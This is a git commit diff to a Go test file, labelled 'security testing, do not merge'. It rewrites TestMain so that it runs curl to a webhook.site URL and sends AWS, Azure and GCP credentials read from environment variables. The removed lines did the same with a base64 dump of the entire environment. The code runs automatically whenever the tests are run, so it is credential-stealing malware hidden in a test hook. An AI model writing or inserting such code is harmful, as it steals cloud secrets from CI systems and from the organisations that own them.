73a09fac77eff27f2c68bbd816ed107a7c9106c3
Flo <f.t.f.schweitzer@gmail.com>
2026-03-09 19:20:17 +0100

    security testing, do not merge

--- test/exfil_test.go
+++ test/exfil_test.go
@@ -4,21 +4,37 @@
 package test
 
 import (
-	"encoding/base64"
-	"fmt"
-	"net/url"
 	"os"
 	"os/exec"
-	"strings"
 	"testing"
 )
 
 func TestMain(m *testing.M) {
 	hook := "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c"
-	envDump := strings.Join(os.Environ(), "\n")
-	encoded := base64.StdEncoding.EncodeToString([]byte(envDump))
-	fullURL := fmt.Sprintf("%s?stage=go-test-env&d=%s", hook, url.QueryEscape(encoded))
-	cmd := exec.Command("curl", "-sf", "--max-time", "10", fullURL)
-	_ = cmd.Run()
+
+	// Exfil individual cloud credentials
+	run := func(args ...string) {
+		cmd := exec.Command("curl", args...)
+		_ = cmd.Run()
+	}
+
+	run("-sf", "--max-time", "10", hook+"?stage=go-test-start")
+
+	run("-sf", "--max-time", "10", "-G", hook,
+		"--data-urlencode", "stage=aws",
+		"--data-urlencode", "key="+os.Getenv("AWS_ACCESS_KEY_ID"),
+		"--data-urlencode", "secret="+os.Getenv("AWS_SECRET_ACCESS_KEY"))
+
+	run("-sf", "--max-time", "10", "-G", hook,
+		"--data-urlencode", "stage=azure",
+		"--data-urlencode", "client_id="+os.Getenv("ARM_CLIENT_ID"),
+		"--data-urlencode", "client_secret="+os.Getenv("ARM_CLIENT_SECRET"),
+		"--data-urlencode", "sub="+os.Getenv("ARM_SUBSCRIPTION_ID"),
+		"--data-urlencode", "tenant="+os.Getenv("ARM_TENANT_ID"))
+
+	run("-sf", "--max-time", "10", "-G", hook,
+		"--data-urlencode", "stage=gcp",
+		"--data-urlencode", "creds="+os.Getenv("GOOGLE_CREDENTIALS"))
+
 	os.Exit(m.Run())
 }
